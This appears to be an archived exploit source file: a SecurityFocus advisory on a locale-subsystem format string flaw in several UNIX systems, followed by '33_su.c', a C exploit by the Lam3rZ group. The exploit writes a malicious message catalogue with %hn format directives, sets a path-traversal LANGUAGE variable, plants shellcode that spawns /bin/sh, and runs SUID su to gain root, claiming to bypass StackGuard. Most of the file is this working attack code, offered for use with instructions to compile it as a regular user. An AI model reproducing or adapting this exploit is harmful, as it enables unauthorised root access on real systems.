/*
source: http://www.securityfocus.com/bid/1634/info
  
nectiva 4.x/5.x,Debian 2.x,IBM AIX 3.x/4.x,Mandrake 7,RedHat 5.x/6.x,IRIX 6.x, Solaris 2.x/7/8,Turbolinux 6.x,Wirex Immunix OS 6.2 Locale Subsystem Format String
 
Many UNIX operating systems provide internationalization support according to the X/Open XPG3, XPG4 and Sun/Uniforum specifications using the of the locale subsystem. The locale subsystem comprises a set of databases that store language and country specific information and a set of library functions used to store, retrieve and generally manage that information.
  
In particular a database with messages used by almost all the operating system programs is keep for each supported language.
  
The programs access this database using the gettext(3), dgettext(3), dcgettext(3) C functions (Sun/Uniforum specifications) or catopen(3), catgets(3) and catclose(3) ( X/Open XPG3 and XPG4 specification).
  
Generally a program that needs to display a message to the user will obtain the proper language specific string from the database using the original message as the search key and printing the results using the printf(3) family of functions. By building and installing a custom messages database an attacker can control the output of the message retrieval functions that get feed to the printf(3) functions.
  
Bad coding practices and the ability to feed format strings to the later functions makes it possible for an attacker to execute arbitrary code as a privileged user (root) using almost any SUID program on the vulnerable systems.
  
Alternatively, on some operating systems, the problem can be exploited remotely using the environment variable passing options in telnetd. However, a remote attacker must be able to place the suitable messages database on the target host (i.e. anonymous ftp, NFS, email, etc.)
  
It should be noted under Linux this problem must be exploited in conjunction with a another flaw in glibc. On RedHat systems, it is possible to evade the protection built-into libc that patches this vulnerability and exploit userhelper to gain root access. RedHat has released packages to fix this vulnerability.
*/


/* 33_su.c exploit for LC glibc format string bug
   it works on StackGuarded version of RH 6.2
   called ImmunixOS (http://www.immunix.org/)
   Exploit (c)Lam3rZ Group by Kil3r of Lam3rZ

   it's the first public sploit that bypases
   StackGuard protection in real world
   it is also a proof of concept described long time ago in Lam3rZ's Phrack
   article "BYPASSING STACKGUARD AND STACKSHIELD" by Bulba and Kil3r
   [http://phrack.infonexus.com/search.phtml?view&article=p56-5]


   greetz: warning3, scut, stealth, bulba, tmoggie, nises, wasik (aka synek ;),
   and teso team, LSD team, HERT, padnieta babcia, z33d,
   lcamtuf aka postawflaszke, clubbing.pl, Lucek Skajuoker (wracaj do
   zdrowia!).

   Special greets go to Crispin Cowan

   Disclaimer: THIS is Lam3rZ style (famouce one). Lam3rz style DO NOT
   exploit bash, do not use bash and does nothing to do with bash scripts!
   Lam3rZ sploits do not like to take any arguments it confuses lamers!


   qwertz ?
   zes !

*/
// lamer:
// compile it as a regular user on a box and it should work! :)

// lam3r:
// read the code carefully and have a fun! :)


#include <stdio.h>

#define EXIT_GOT      	0x804c624
#define WHERESHELLCODE  0xbfffff81

#define ENV             "LANGUAGE=fi_FI/../../../../../../tmp"
#define PATH             "/tmp/LC_MESSAGES"



char *env[11];
char code[]=
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
char hacker[]="\x24\xc6\x04\x08\x89\x89\x89\x89\x25\xc6\x04\x08\x89\x89\x89\x89\x26\xc6\x04\x08\x89\x89\x89\x89\x27\xc6\x04\x08\x44\x44\x44";

main () {
char buf[1024];
FILE *fp;

if(mkdir(PATH,0755) < 0)
{
perror("mkdir");
}
chdir(PATH);
if( !(fp = fopen("libc.po", "w+")))
{
perror("fopen");
exit(1);
}

strcpy(buf,"%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%dAAAA%226d%hn%126d%hn%256d%hn%192d%hn");

fprintf(fp,"msgid \"%%s: invalid option -- %%c\\n\"\n");
fprintf(fp,"msgstr \"%s\\n\"", buf);
fclose(fp);


system("/usr/bin/msgfmt libc.po -o libc.mo");
env[1]=ENV;
env[0]=code;
env[2]=hacker;
env[3]=NULL;
printf("ZAJEBI�CIE!!!\nA teraz b�dziesz le�a� i ta�czy� r�czk�!\n");
execle("/bin/su","su","-u", NULL,env);
}